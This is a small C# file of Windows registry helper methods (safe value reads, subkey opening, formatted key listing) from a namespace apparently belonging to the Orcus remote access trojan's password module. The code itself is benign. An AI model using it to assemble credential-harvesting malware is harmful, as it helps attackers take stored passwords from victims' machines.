using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;

namespace Orcus.Commands.Passwords.Utilities;

public static class RegistryKeyExtensions
{
	private static bool IsNameOrValueNull(this string keyName, RegistryKey key)
	{
		if (!string.IsNullOrEmpty(keyName))
		{
			return key == null;
		}
		return true;
	}

	public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
	{
		try
		{
			return key.GetValue(keyName, defaultValue)!.ToString();
		}
		catch
		{
			return defaultValue;
		}
	}

	public static RegistryKey OpenReadonlySubKeySafe(this RegistryKey key, string name)
	{
		try
		{
			return key.OpenSubKey(name, writable: false);
		}
		catch
		{
			return null;
		}
	}

	public static RegistryKey OpenWritableSubKeySafe(this RegistryKey key, string name)
	{
		try
		{
			return key.OpenSubKey(name, writable: true);
		}
		catch
		{
			return null;
		}
	}

	public static IEnumerable<string> GetFormattedKeyValues(this RegistryKey key)
	{
		if (key == null)
		{
			yield break;
		}
		foreach (string item in from keyVal in key.GetValueNames()
			where !keyVal.IsNameOrValueNull(key)
			select keyVal into k
			where !string.IsNullOrEmpty(k)
			select k)
		{
			yield return $"{item}||{key.GetValueSafe(item)}";
		}
	}
}
